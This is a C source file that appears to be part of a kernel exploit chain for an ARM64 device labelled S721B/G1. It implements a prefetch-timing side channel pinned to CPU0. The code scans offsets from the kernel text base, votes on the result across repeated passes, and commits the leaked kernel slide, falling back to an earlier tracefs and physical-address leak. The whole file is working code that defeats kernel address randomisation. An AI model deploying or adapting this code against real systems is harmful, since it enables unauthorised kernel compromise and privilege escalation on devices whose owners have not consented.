#define _GNU_SOURCE

/*
 * S721B/G1 CPU0-first slide wrapper.
 *
 * The existing slide_app.c is included into this translation unit with its
 * public slide entry point renamed.  This lets the target-specific CPU0
 * detector run first while preserving the existing tracefs -> physical-P0
 * fallback chain in the legacy implementation.
 */
#define slide_leak_kernel_base slide_leak_kernel_base_legacy
#include "slide_app.c"
#undef slide_leak_kernel_base

#ifndef CPU0_PREFETCH_SAMPLES
#define CPU0_PREFETCH_SAMPLES 32
#endif
#ifndef CPU0_PREFETCH_BURST
#define CPU0_PREFETCH_BURST 512
#endif
#ifndef CPU0_PREFETCH_SCAN_STEP
#define CPU0_PREFETCH_SCAN_STEP 0x8000ULL
#endif
#ifndef CPU0_PREFETCH_MAX_SLIDE
#define CPU0_PREFETCH_MAX_SLIDE 0x1f0000ULL
#endif
#ifndef CPU0_PREFETCH_EDGE_RUN
#define CPU0_PREFETCH_EDGE_RUN 8
#endif
#ifndef CPU0_PREFETCH_REPEATS
#define CPU0_PREFETCH_REPEATS 3
#endif

static inline uint64_t cpu0_read_counter(void) {
  uint64_t value;
  __asm__ volatile("isb\n\tmrs %0, cntvct_el0\n\tisb"
                   : "=r"(value) :: "memory");
  return value;
}

static inline uint64_t cpu0_measure_prefetch(uintptr_t address) {
  __asm__ volatile("dsb sy\n\tisb" ::: "memory");
  uint64_t started = cpu0_read_counter();

  for (int index = 0; index < CPU0_PREFETCH_BURST; index++) {
    __asm__ volatile("prfm plil1keep, [%0]"
                     :
                     : "r"(address)
                     : "memory");
  }

  __asm__ volatile("dsb sy\n\tisb" ::: "memory");
  return cpu0_read_counter() - started;
}

static int cpu0_compare_u64(const void *left, const void *right) {
  uint64_t a = *(const uint64_t *)left;
  uint64_t b = *(const uint64_t *)right;
  return (a > b) - (a < b);
}

static uint64_t cpu0_quantile(uintptr_t address) {
  uint64_t samples[CPU0_PREFETCH_SAMPLES];

  for (size_t index = 0; index < CPU0_PREFETCH_SAMPLES; index++) {
    samples[index] = cpu0_measure_prefetch(address);
  }

  qsort(samples, CPU0_PREFETCH_SAMPLES, sizeof(samples[0]),
        cpu0_compare_u64);
  return samples[3];
}

static int cpu0_measure_triplet(uintptr_t candidate,
                                uintptr_t mapped,
                                uintptr_t unmapped,
                                uint64_t *candidate_q,
                                uint64_t *mapped_q,
                                uint64_t *unmapped_q) {
  uint64_t candidate_samples[CPU0_PREFETCH_SAMPLES];
  uint64_t mapped_samples[CPU0_PREFETCH_SAMPLES];
  uint64_t unmapped_samples[CPU0_PREFETCH_SAMPLES];

  for (size_t index = 0; index < CPU0_PREFETCH_SAMPLES; index++) {
    candidate_samples[index] = cpu0_measure_prefetch(candidate);
    mapped_samples[index] = cpu0_measure_prefetch(mapped);
    unmapped_samples[index] = cpu0_measure_prefetch(unmapped);
  }

  qsort(candidate_samples, CPU0_PREFETCH_SAMPLES,
        sizeof(candidate_samples[0]), cpu0_compare_u64);
  qsort(mapped_samples, CPU0_PREFETCH_SAMPLES,
        sizeof(mapped_samples[0]), cpu0_compare_u64);
  qsort(unmapped_samples, CPU0_PREFETCH_SAMPLES,
        sizeof(unmapped_samples[0]), cpu0_compare_u64);

  *candidate_q = candidate_samples[3];
  *mapped_q = mapped_samples[3];
  *unmapped_q = unmapped_samples[3];
  return 1;
}

static int cpu0_baseline(uintptr_t *mapped_out,
                         uintptr_t *unmapped_out,
                         uint64_t *mapped_q_out,
                         uint64_t *unmapped_q_out) {
  uintptr_t mapped_address = (uintptr_t)&cpu0_measure_prefetch;

  unsigned char *unmapped = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE,
                                  MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
  if (unmapped == MAP_FAILED) {
    pr_warning("slide cpu0 baseline mmap failed errno=%d\n", errno);
    return 0;
  }

  uintptr_t unmapped_address = (uintptr_t)unmapped;
  if (munmap(unmapped, PAGE_SIZE) != 0) {
    pr_warning("slide cpu0 baseline munmap failed errno=%d\n", errno);
    return 0;
  }

  uint64_t mapped_q = cpu0_quantile(mapped_address);
  uint64_t unmapped_q = cpu0_quantile(unmapped_address);

  pr_info("slide cpu0 baseline mapped=%llu unmapped=%llu delta=%lld\n",
          (unsigned long long)mapped_q,
          (unsigned long long)unmapped_q,
          (long long)((int64_t)unmapped_q - (int64_t)mapped_q));

  if (unmapped_q <= mapped_q ||
      unmapped_q - mapped_q < 8 ||
      unmapped_q - mapped_q < mapped_q / 2) {
    pr_warning("slide cpu0 baseline separation failed\n");
    return 0;
  }

  *mapped_out = mapped_address;
  *unmapped_out = unmapped_address;
  *mapped_q_out = mapped_q;
  *unmapped_q_out = unmapped_q;
  return 1;
}

static uint64_t cpu0_find_slide_once(void) {
  uintptr_t mapped_address;
  uintptr_t unmapped_address;
  uint64_t mapped_q;
  uint64_t unmapped_q;

  if (!cpu0_baseline(&mapped_address, &unmapped_address,
                     &mapped_q, &unmapped_q)) {
    return UINT64_MAX;
  }

  uint64_t threshold = mapped_q + (unmapped_q - mapped_q) / 2;
  uint64_t edge = UINT64_MAX;
  unsigned high_run = 0;
  unsigned low_run = 0;

  for (uint64_t offset = 0;
       offset <= CPU0_PREFETCH_MAX_SLIDE;
       offset += CPU0_PREFETCH_SCAN_STEP) {
    uint64_t candidate_q;
    uint64_t local_mapped;
    uint64_t local_unmapped;

    if (!cpu0_measure_triplet(
            KIMAGE_TEXT_BASE + offset,
            mapped_address,
            unmapped_address,
            &candidate_q,
            &local_mapped,
            &local_unmapped)) {
      high_run = 0;
      low_run = 0;
      continue;
    }

    /* Recalibrate the threshold when the local timing floor moves. */
    if (local_unmapped <= local_mapped ||
        local_unmapped - local_mapped < 8 ||
        local_unmapped - local_mapped < local_mapped / 2) {
      high_run = 0;
      low_run = 0;
      continue;
    }

    uint64_t local_threshold =
        local_mapped + (local_unmapped - local_mapped) / 2;

    if (candidate_q > local_threshold || candidate_q > threshold) {
      low_run = 0;
      high_run = high_run < CPU0_PREFETCH_EDGE_RUN
          ? high_run + 1
          : CPU0_PREFETCH_EDGE_RUN;
    } else if (high_run >= CPU0_PREFETCH_EDGE_RUN) {
      if (!low_run) {
        edge = offset;
      }
      if (++low_run >= CPU0_PREFETCH_EDGE_RUN) {
        break;
      }
    } else {
      high_run = 0;
      low_run = 0;
    }

    if (offset > CPU0_PREFETCH_MAX_SLIDE - CPU0_PREFETCH_SCAN_STEP) {
      break;
    }
  }

  if (edge == UINT64_MAX) {
    pr_warning("slide cpu0 scan found no edge\n");
    return UINT64_MAX;
  }

  pr_info("slide cpu0 scan candidate=%08llx\n",
          (unsigned long long)edge);
  return edge;
}

static int slide_leak_cpu0_first(void) {
  cpu_set_t original_set;
  cpu_set_t cpu0_set;
  uint64_t values[CPU0_PREFETCH_REPEATS];
  unsigned successful = 0;
  unsigned best_count = 0;
  uint64_t best = UINT64_MAX;

  if (sched_getaffinity(0, sizeof(original_set), &original_set) != 0) {
    pr_warning("slide cpu0 getaffinity failed errno=%d\n", errno);
    return 0;
  }

  CPU_ZERO(&cpu0_set);
  CPU_SET(0, &cpu0_set);
  if (sched_setaffinity(0, sizeof(cpu0_set), &cpu0_set) != 0) {
    pr_warning("slide cpu0 setaffinity failed errno=%d\n", errno);
    return 0;
  }

  if (sched_getcpu() != 0) {
    pr_warning("slide cpu0 affinity verification failed cpu=%d\n",
               sched_getcpu());
    sched_setaffinity(0, sizeof(original_set), &original_set);
    return 0;
  }

  pr_info("slide source priority=cpu0\n");

  for (unsigned index = 0; index < CPU0_PREFETCH_REPEATS; index++) {
    values[index] = cpu0_find_slide_once();
    if (values[index] == UINT64_MAX) {
      continue;
    }

    successful++;
    unsigned count = 0;
    for (unsigned prior = 0; prior <= index; prior++) {
      if (values[prior] == values[index]) {
        count++;
      }
    }

    if (count > best_count) {
      best_count = count;
      best = values[index];
    }

    pr_info("slide cpu0 pass=%u/%u value=%s\n",
            index + 1,
            CPU0_PREFETCH_REPEATS,
            values[index] == UINT64_MAX ? "FAIL" : "OK");
  }

  if (sched_setaffinity(0, sizeof(original_set), &original_set) != 0) {
    pr_warning("slide cpu0 restore affinity failed errno=%d\n", errno);
  }

  if (successful < 2 || best_count * 2 <= successful) {
    pr_warning("slide cpu0 consensus failed successful=%u best_votes=%u\n",
               successful, best_count);
    return 0;
  }

  if ((best & 0x7fffULL) != 0 || best > CPU0_PREFETCH_MAX_SLIDE) {
    pr_warning("slide cpu0 candidate rejected=%08llx\n",
               (unsigned long long)best);
    return 0;
  }

  pr_success("slide cpu0 consensus=%08llx votes=%u/%u\n",
             (unsigned long long)best, best_count, successful);

  return slide_commit_stext(KIMAGE_TEXT_BASE + best, "cpu0");
}

/* CPU0 is authoritative only when its validated consensus succeeds. */
int slide_leak_kernel_base(void) {
  if (slide_leak_cpu0_first()) {
    return 1;
  }

  pr_warning("slide cpu0 failed; falling back to existing tracefs -> physical chain\n");
  return slide_leak_kernel_base_legacy();
}
